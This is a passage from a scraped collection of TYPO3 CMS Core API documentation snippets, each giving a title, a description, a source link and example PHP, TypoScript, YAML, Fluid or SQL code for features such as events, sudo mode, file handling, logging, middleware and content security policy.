configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/MultiFactorAuthentication/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\nauth.mfa.recommendedProvider = totp\n```\n\n----------------------------------------\n\nTITLE: Defining AfterMailerSentMessageEvent Class in PHP for TYPO3 CMS Core Mail Event\nDESCRIPTION: This snippet defines the AfterMailerSentMessageEvent class in the TYPO3\\CMS\\Core\\Mail\\Event namespace. The class is fired after a Mailer has sent a message and allows listeners to execute further code based on the result. It includes a method to retrieve the Mailer object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterMailerSentMessageEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Mail\\Event;\n\nclass AfterMailerSentMessageEvent\n{\n    public function getMailer(): \\Symfony\\Component\\Mailer\\MailerInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Direct Binding with JavaScript Event API in TYPO3\nDESCRIPTION: Demonstrates how to directly bind an event listener to an element using the TYPO3 JavaScript Event API. The RegularEvent binds a click event listener to a button element with the class 'my-button'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/EventApi/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport RegularEvent from '@typo3/core/event/regular-event.js';\n\nnew RegularEvent('click', function(e) {\n  // Your code\n}).bindTo(document.querySelector('.my-button'));\n```\n\n----------------------------------------\n\nTITLE: Using BeforeJavaScriptsRenderingEvent in TYPO3\nDESCRIPTION: Event class reference showing the BeforeJavaScriptsRenderingEvent fired before JavaScript rendering in TYPO3. This event occurs before AssetRenderer::renderJavaScript or renderInlineJavaScript is executed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Page/BeforeJavaScriptsRenderingEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Page\\Event\\BeforeJavaScriptsRenderingEvent\n```\n\n----------------------------------------\n\nTITLE: Configuring Sudo Mode for Backend Routes in PHP\nDESCRIPTION: This code snippet shows how to configure sudo mode for backend routes in TYPO3. It demonstrates setting up the sudo mode group and lifetime for specific routes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/SudoMode.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nuse TYPO3\\CMS\\Backend\\Security\\SudoMode\\Access\\AccessLifetime;\n\nreturn [\n    'my-module' => [\n        'path' => '/my/module',\n        'target' => MyVendor\\MyExtension\\Controller\\MyModuleController::class . '::handleRequest',\n        'sudoMode' => [\n            'group' => 'my-module-group',\n            'lifetime' => AccessLifetime::medium,\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Console Asset URL Command\nDESCRIPTION: Command to list all installed TYPO3 extensions and their public resource directory hashes\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/AssetMigration.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 frontend:asseturl\n```\n\n----------------------------------------\n\nTITLE: Using PHP backed enum for TYPO3 state enumeration\nDESCRIPTION: The updated version of the State class implemented as a PHP backed enum. This is the recommended approach starting from TYPO3 v14.0 after the deprecation and removal of the Enumeration abstract class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/BitSets/Enumeration.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Enumeration;\n\nenum State: int\n{\n    case STATE_NEW = 1;\n    case STATE_PENDING = 2;\n    case STATE_DECLINED = 3;\n    case STATE_ACCEPTED = 4;\n\n    /**\n     * Get the state label\n     */\n    public function getStateLabel(): string\n    {\n        return match ($this) {\n            self::STATE_NEW => 'new',\n            self::STATE_PENDING => 'pending',\n            self::STATE_DECLINED => 'declined',\n            self::STATE_ACCEPTED => 'accepted',\n        };\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Request Object in User Function\nDESCRIPTION: Demonstrates how to access the request object within a TypoScript user function implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Typo3Request.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ServerRequestInterface;\n\nfinal class MyUserFunction\n{\n    public function doSomething(\n        string $content,\n        array $conf,\n        ServerRequestInterface $request\n    ): string {\n        // ...\n\n        // Retrieve the language attribute via the request object\n        $language = $request->getAttribute('language');\n\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Internal Page Error Handler in TYPO3 YAML\nDESCRIPTION: This snippet demonstrates how to configure an internal page-based error handler for 404 errors in TYPO3. It specifies the error code, handler type, and the internal page UID to be displayed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ErrorHandling/PageErrorHandler.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nerrorHandling:\n  - errorCode: 404\n    errorHandler: Page\n    errorContentSource: 't3://page?uid=145'\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Post-Processing Hook in TYPO3\nDESCRIPTION: Example of how to register a cache post-processing hook in TYPO3 from an extension's ext_localconf.php file. This allows custom PHP functions to process cache entries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n// Add cache hook\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['t3lib/class.t3lib_tcemain.php']['clearCachePostProc']['my_extension'] = \n    '\\MyVendor\\MyExtension\\Hooks\\DataHandlerHook->postProcessClearCache';\n```\n\n----------------------------------------\n\nTITLE: Configuring composer.json for TYPO3 Extension\nDESCRIPTION: A minimal example of a composer.json file for a TYPO3 extension. It includes the composer name, type, description, dependencies, and extension key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/ComponentsOfTYPO3Extension/MakingTheExtensionInstallable.rst#2025-04-16_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"vendor/example-extension\",\n  \"description\": \"description for example extension\",\n  \"type\": \"typo3-cms-extension\",\n  \"require\": {\n    \"php\": \"~8.2.0 || ~8.3.0\",\n    \"typo3/cms-core\": \"^13.4.0\",\n    \"typo3/cms-extbase\": \"^13.4.0\",\n    \"typo3/cms-fluid\": \"^13.4.0\",\n    \"typo3/cms-frontend\": \"^13.4.0\"\n  },\n  \"extra\": {\n    \"typo3/cms\": {\n      \"extension-key\": \"example_extension\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Referenced Files in TYPO3 FAL\nDESCRIPTION: Shows how to retrieve files that are referenced from other records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n$fileRepository = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n    \\TYPO3\\CMS\\Core\\Resource\\FileRepository::class\n);\n$fileObjects = $fileRepository->findByRelation('pages', 'media', $uid);\n```\n\n----------------------------------------\n\nTITLE: Removing Registry Entries in TYPO3 CMS (PHP)\nDESCRIPTION: The remove() method unsets a persistent entry from the registry. It takes a namespace and a key to identify the entry to be removed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Registry/Registry.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nremove(?string $namespace, ?string $key)\n```\n\n----------------------------------------\n\nTITLE: Using Custom Flash Message Queue in Extbase Controller (PHP)\nDESCRIPTION: Demonstrates how to create and use a custom flash message queue in an Extbase controller. This allows for more granular control over message display and management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/Extbase.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$customQueue = $this->getFlashMessageQueue('tx_myvendor_customqueue');\n// Instead of using $this->addFlashMessage() you will instead directly\n// access the custom queue:\n$flashMessage = GeneralUtility::makeInstance(\n        FlashMessage::class,\n        'My flash message in a custom queue',\n        'My flash message title of a custom queue',\n        ContextualFeedbackSeverity::OK,\n        $storeInSession = true,\n);\n$customQueue->enqueue($flashMessage);\n```\n\n----------------------------------------\n\nTITLE: Basic Functional Test Setup in PHP for TYPO3 Styleguide\nDESCRIPTION: Demonstrates the basic setup for a functional test extending FunctionalTestCase and loading the styleguide extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\nnamespace TYPO3\\CMS\\Styleguide\\Tests\\Functional\\TcaDataGenerator;\n\nuse TYPO3\\TestingFramework\\Core\\Functional\\FunctionalTestCase;\n\nfinal class GeneratorTest extends FunctionalTestCase\n{\n    protected array $testExtensionsToLoad = [\n        'typo3conf/ext/styleguide',\n    ];\n\n    public function testGenerator(): void\n    {\n        $this->assertTrue(true);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using ImageViewHelper with FAL in Fluid\nDESCRIPTION: Demonstrates how to use the Fluid ImageViewHelper with a file reference object, which can be of type \\TYPO3\\CMS\\Core\\Resource\\File, \\TYPO3\\CMS\\Core\\Resource\\FileReference, or \\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Frontend.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:image image=\"{image}\" />\n```\n\n----------------------------------------\n\nTITLE: Using For-Loop ViewHelper in Fluid\nDESCRIPTION: Example of using the f:for ViewHelper to iterate over a collection of results in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_13\n\nLANGUAGE: html\nCODE:\n```\n<f:for each=\"{results}\" as=\"result\">\n   <li>{result.title}</li>\n</f:for>\n```\n\n----------------------------------------\n\nTITLE: Channel Configuration with Class Attribute in TYPO3\nDESCRIPTION: Example of assigning a custom channel to a logger using the Channel attribute at the class level in TYPO3. This allows grouping logs of related classes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Service;\n\nuse Psr\\Log\\LoggerInterface;\nuse TYPO3\\CMS\\Core\\Log\\Channel;\n\n#[Channel('security')]\nclass MyClass\n{\n    private LoggerInterface $logger;\n\n    public function __construct(LoggerInterface $logger)\n    {\n        $this->logger = $logger;\n    }\n\n    public function doSomething(): void\n    {\n        $this->logger->info('Something happened');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Frontend Cache Instruction in Later Middleware in TYPO3\nDESCRIPTION: This code shows how to interact with the frontend cache instruction in a middleware that runs after the typo3/cms-frontend/tsfe middleware. In this case, the attribute is guaranteed to exist and can be accessed directly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheInstruction.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Middleware;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\MiddlewareInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\nuse TYPO3\\CMS\\Frontend\\Cache\\CacheInstruction;\n\nfinal class MyLateMiddleware implements MiddlewareInterface\n{\n    public function process(ServerRequestInterface $request, RequestHandlerInterface $handler): ResponseInterface\n    {\n        // Get the instruction. It *is* available in late middlewares\n        /** @var CacheInstruction $cacheInstruction */\n        $cacheInstruction = $request->getAttribute('frontend.cache.instruction');\n        // Check if caching is enabled\n        if ($cacheInstruction->isCachingEnabled()) {\n            // Probably override stuff for any reason\n            $cacheInstruction = $cacheInstruction->withDisabledCache();\n            $request = $request->withAttribute('frontend.cache.instruction', $cacheInstruction);\n        }\n        return $handler->handle($request);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a ModifyPageLayoutContentEvent Listener in TYPO3 CMS\nDESCRIPTION: An example implementation of an event listener for the ModifyPageLayoutContentEvent. This listener can add, overwrite, or reorder content in the TYPO3 backend page module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyPageLayoutContentEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\ModifyPageLayoutContentEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyPageLayoutContentEvent $event): void\n    {\n        // Get all content\n        $content = $event->getContent();\n\n        // Add content at a specific position\n        $event->addContent('myKey', 'My content', 15);\n\n        // Get specific content\n        $event->getContentByIdentifier('myKey');\n\n        // Add content to the end\n        $event->addContent('myKey2', 'My content at the end');\n\n        // Replace all content\n        $event->setContent(['myKey' => 'My content']);\n\n        // Set content for specific key, overwriting existing content\n        $event->setContentByIdentifier('myKey', 'My overwritten content');\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: TypoScript IMAGE Object Configuration\nDESCRIPTION: Demonstrates configuring an IMAGE object with GIFBUILDER for rendering text as an image.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.title = IMAGE\nlib.title {\n  file = GIFBUILDER\n  file {\n     10 = TEXT\n     10.value = Extbase and Fluid\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Extension with ext_emconf.php in PHP\nDESCRIPTION: This PHP code defines the configuration for a TYPO3 extension named 'Tea example'. It specifies the extension's title, description, version, category, dependencies (PHP, TYPO3, Extbase, Fluid, Frontend), state, author information, autoloading configuration (PSR-4 for both standard and development classes), and other metadata.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/ExtEmconf.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n$EM_CONF[$_EXTKEY] = [\n    'title' => 'Tea example',\n    'description' => 'Example extension for unit testing and best practices',\n    'version' => '3.1.0',\n    'category' => 'example',\n    'constraints' => [\n        'depends' => [\n            'php' => '7.4.0-8.3.99',\n            'typo3' => '11.5.4-12.4.99',\n            'extbase' => '11.5.4-12.4.99',\n            'fluid' => '11.5.4-12.4.99',\n            'frontend' => '11.5.4-12.4.99',\n        ],\n    ],\n    'state' => 'stable',\n    'uploadfolder' => false,\n    'createDirs' => '',\n    'author' => 'Oliver Klee, Daniel Siepmann, Łukasz Uznański',\n    'author_email' => 'typo3-coding@oliverklee.de, coding@daniel-siepmann.de, lukaszuznanski94@gmail.com',\n    'author_company' => 'TYPO3 Best Practices Team',\n    'autoload' => [\n        'psr-4' => [\n            'TTN\\\\Tea\\\\' => 'Classes/',\n        ],\n    ],\n    'autoload-dev' => [\n        'psr-4' => [\n            'TTN\\\\Tea\\\\Tests\\\\' => 'Tests/',\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Getting File by Filename from Folder in TYPO3 FAL\nDESCRIPTION: Shows how to retrieve a file by its filename from a specific folder path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$storage = $resourceFactory->getDefaultStorage();\n$folder = $storage->getFolder('/some/path/');\n$file = $storage->getFileInFolder('filename.jpg', $folder);\n```\n\n----------------------------------------\n\nTITLE: Configuring UnitTests.xml for Extension Testing\nDESCRIPTION: Adjustments to the UnitTests.xml configuration file for testing TYPO3 extensions. This diff shows how to modify the test suite to point to the extension's Unit tests directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n<testsuites>\n    <testsuite name=\"Unit tests\">\n-        <directory>../../../../../../typo3/sysext/*/Tests/Unit/</directory>\n+        <directory>../../Tests/Unit/</directory>\n    </testsuite>\n</testsuites>\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Backend Entry Point in TYPO3\nDESCRIPTION: This snippet demonstrates how to configure a custom backend entry point using the `$GLOBALS['TYPO3_CONF_VARS']['BE']['entryPoint']` setting. This allows specifying a custom URL path or domain name for accessing the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/BE.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['BE']['entryPoint'] = '/my-specific-path';\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Module Data in TYPO3 Backend Controller\nDESCRIPTION: This code demonstrates how to retrieve the ModuleData object from a PSR-7 Request attribute in a TYPO3 backend controller.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleDataObject.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n$MOD_SETTINGS = $request->getAttribute('moduleData');\n```\n\n----------------------------------------\n\nTITLE: Injecting AssetCollector in a TYPO3 Class\nDESCRIPTION: Example of a PHP class that demonstrates how to use Dependency Injection to inject the AssetCollector in a TYPO3 extension class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Assets/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension;\n\nuse TYPO3\\CMS\\Core\\Page\\AssetCollector;\n\nclass MyClass\n{\n    protected AssetCollector $assetCollector;\n\n    public function __construct(AssetCollector $assetCollector)\n    {\n        $this->assetCollector = $assetCollector;\n    }\n\n    public function addMyJavaScript(): void\n    {\n        // Register a JavaScript file\n        $this->assetCollector->addJavaScript(\n            'my_ext_foo',\n            'EXT:my_extension/Resources/Public/JavaScript/foo.js',\n            ['data-foo' => 'bar']\n        );\n        \n        // Register inline JavaScript code\n        $this->assetCollector->addInlineJavaScript(\n            'my_ext_foo_inline',\n            'console.log(\"Hello World\")',\n            ['data-foo' => 'bar'],\n            ['priority' => true]\n        );\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: SQL Mode Configuration Reference for TYPO3 Database\nDESCRIPTION: SQL mode setting reference showing supported configurations for TYPO3 CMS version 12 and above. These settings control SQL language behavior in MySQL and MariaDB.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/SystemRequirements/Database.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSQL_MODE\n```\n\n----------------------------------------\n\nTITLE: Accessing Dynamic Array or Object Properties in Fluid\nDESCRIPTION: Shows how to use a variable as the key or property name when accessing array or object values in Fluid templates.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n{myArray.{myIndex}}\n```\n\n----------------------------------------\n\nTITLE: Rendering File Collections in a TYPO3 Fluid Template\nDESCRIPTION: This Fluid template iterates through file collections to display their titles and all files contained within each collection. It shows how to access collection properties and how to loop through the files to display their properties like title and description.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Collections/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<html xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\"\n      data-namespace-typo3-fluid=\"true\">\n\n<f:layout name=\"Default\" />\n\n<f:section name=\"content\">\n    <f:for each=\"{collections}\" as=\"collection\">\n        <h2>{collection.title}</h2>\n        <ul>\n        <f:for each=\"{collection}\" as=\"file\">\n            <li>\n                {file.name} ({file.extension})\n                <f:if condition=\"{file.title}\">\n                    <strong>{file.title}</strong><br/>\n                </f:if>\n                <f:if condition=\"{file.description}\">\n                    <em>{file.description}</em>\n                </f:if>\n            </li>\n        </f:for>\n        </ul>\n    </f:for>\n</f:section>\n\n</html>\n```\n\n----------------------------------------\n\nTITLE: Extending an Original Extbase Model\nDESCRIPTION: PHP class that extends the original Extbase model to add custom fields. The snippet shows the standard structure of an extended model with getter and setter methods for a custom field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendExtbaseModel/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\Model;\n\nuse OriginalVendor\\OriginalExtension\\Domain\\Model\\SomeModel;\n\nclass MyExtendedModel extends SomeModel\n{\n    protected string $myExtensionCustomField = '';\n\n    public function getMyExtensionCustomField(): string\n    {\n        return $this->myExtensionCustomField;\n    }\n\n    public function setMyExtensionCustomField(string $myExtensionCustomField): void\n    {\n        $this->myExtensionCustomField = $myExtensionCustomField;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Retrieving the UserSessionManager in TYPO3 CMS\nDESCRIPTION: This snippet demonstrates how to retrieve the UserSessionManager instance using its static factory method create(). The UserSessionManager requires specifying a login type ('BE' for backend or 'FE' for frontend) when creating an instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/Sessions/UserSessionManagement.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Session\\UserSessionManager;\n\n$loginType = 'BE'; // or 'FE' for frontend\n$userSessionManager = UserSessionManager::create($loginType);\n```\n\n----------------------------------------\n\nTITLE: PHP Policy Builder Implementation\nDESCRIPTION: Example code showing how to build a CSP policy programmatically using PHP\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$policy = new Policy();\n$policy->extend(Directive::DefaultSrc, SourceKeyword::self);\n$policy->extend(Directive::ImgSrc, SourceKeyword::self, SourceScheme::data, UriValue::hostAndScheme('https://*.typo3.org'));\n$policy->extend(Directive::ScriptSrc, SourceKeyword::self, Nonce::create());\n$policy->extend(Directive::WorkerSrc, SourceScheme::blob);\n\nheader('Content-Security-Policy: ' . $policy->compile($nonce));\n```\n\n----------------------------------------\n\nTITLE: Creating Dashboard Table in SQL for TYPO3 Extension\nDESCRIPTION: SQL definition for the be_dashboards table from the dashboard system extension. This creates a table with fields for identifier, title, and widgets to store dashboard configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/DatabaseUpgrade/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE be_dashboards (\n    identifier varchar(120) DEFAULT '' NOT NULL,\n    title varchar(120) DEFAULT '' NOT NULL,\n    widgets text\n);\n```\n\n----------------------------------------\n\nTITLE: Referencing the BackendUserAuthentication Class in TYPO3\nDESCRIPTION: Demonstrates the fully qualified class name for the BackendUserAuthentication class in TYPO3, which is the core class responsible for handling backend user authentication and permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/BackendUsers/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication\n```\n\n----------------------------------------\n\nTITLE: Rendering Pagination in Fluid Template\nDESCRIPTION: Example Fluid template that renders pagination controls for an ArrayPaginator. It displays the current page number, total pages, and navigation links to previous and next pages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Pagination/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<nav>\n    <p>\n        Items {paginator.firstItemNumber} - {paginator.lastItemNumber} of {paginator.numberOfItems}\n    </p>\n\n    <ul class=\"pagination\">\n        <f:if condition=\"{pagination.previousPageNumber}\">\n            <li class=\"page-item\">\n                <f:link.action arguments=\"{currentPage: pagination.previousPageNumber}\" class=\"page-link\">Previous</f:link.action>\n            </li>\n        </f:if>\n\n        <f:for each=\"{pagination.allPageNumbers}\" as=\"pageNumber\">\n            <li class=\"page-item{f:if(condition: '{pageNumber} == {paginator.currentPageNumber}', then: ' active')}\">\n                <f:link.action arguments=\"{currentPage: pageNumber}\" class=\"page-link\">{pageNumber}</f:link.action>\n            </li>\n        </f:for>\n        \n        <f:if condition=\"{pagination.nextPageNumber}\">\n            <li class=\"page-item\">\n                <f:link.action arguments=\"{currentPage: pagination.nextPageNumber}\" class=\"page-link\">Next</f:link.action>\n            </li>\n        </f:if>\n    </ul>\n</nav>\n```\n\n----------------------------------------\n\nTITLE: Configuring PageType Decorator in TYPO3 YAML\nDESCRIPTION: This YAML configuration sets up a PageType decorator route enhancer. It maps different file extensions to specific page type numbers and sets a default extension for regular pages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  PageTypeSuffix:\n    type: PageType\n    default: '.html'\n    index: 'index'\n    map:\n      'rss.feed': 13\n      '.json': 26\n```\n\n----------------------------------------\n\nTITLE: Defining Controller Actions in TYPO3 Backend Module Configuration\nDESCRIPTION: This code snippet demonstrates how to define controller action pairs in a TYPO3 backend module configuration file. It shows the structure for mapping controller class names to their respective actions, which can be defined as arrays or comma-separated lists.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n// Excerpt of EXT:my_extension/Configuration/Backend/Modules.php\n```\n\n----------------------------------------\n\nTITLE: Implementing HTTP Method Enforcement in TYPO3 Extbase Controllers\nDESCRIPTION: This code demonstrates how to enforce HTTP methods in an Extbase module controller using AllowedMethodsTrait. It enforces GET for list actions and POST for delete actions through initialize methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/SecurityConsiderations.rst#2025-04-16_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n<?php\nnamespace Example\\Demo\\Controller;\n\nuse Example\\Demo\\Domain\\Model\\Thing;\nuse Example\\Demo\\Domain\\Repository\\ThingRepository;\n+ use TYPO3\\CMS\\Core\\Http\\AllowedMethodsTrait;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass ExtbaseModuleController extends ActionController\n{\n+     use AllowedMethodsTrait;\n+\n    protected readonly ModuleTemplate $moduleTemplate;\n    protected readonly ThingRepository $thingRepository;\n\n+     protected function initializeListAction(): void\n+     {\n+         $this->assertAllowedHttpMethod($this->request, 'GET');\n+     }\n+\n    public function listAction(): ResponseInterface\n    {\n        $this->moduleTemplate->assignMultiple([\n            